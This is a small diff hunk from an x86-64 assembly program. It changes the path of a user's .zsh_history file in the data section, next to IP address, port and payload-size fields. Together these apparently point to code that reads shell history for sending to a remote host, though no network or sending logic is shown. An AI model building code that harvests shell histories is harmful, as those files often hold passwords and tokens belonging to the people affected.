@@ -18,7 +18,7 @@ global _payload_size
 %endmacro
 
 section .data
-    path db '/Users/maxencegama/.zsh_history', 0
+    path db '/home/maxence/.zsh_history', 0
     addr_ip dd 0
     port dw 0x0
     stat_buffer times 144 db 0  ; Taille de struct stat sur x86-64
